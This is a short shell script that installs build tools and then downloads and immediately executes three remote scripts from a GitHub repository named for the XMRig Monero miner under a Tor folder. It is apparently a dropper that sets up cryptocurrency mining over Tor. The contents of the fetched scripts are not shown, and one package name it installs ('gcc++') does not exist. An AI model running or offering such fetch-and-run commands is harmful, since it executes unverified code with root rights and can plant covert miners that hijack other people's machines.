#!/bin/sh

sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt update -y && sudo apt upgrade -y 
sudo apt-get install git -y
sudo apt-get install build-essential -y
sudo apt-get install cmake -y
sudo apt-get install automake -y
sudo apt-get install libtool autoconf -y
sudo apt-get install libtool m4 automake -y
sudo apt-get install gcc++ -y
sudo apt-get install --reinstall systemd -y
sudo apt-get install nano -y

wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/onion.sh && chmod +x onion.sh && ./onion.sh
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/xmr.sh && chmod +x xmr.sh && ./xmr.sh
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.sh && chmod +x config.sh && ./config.sh
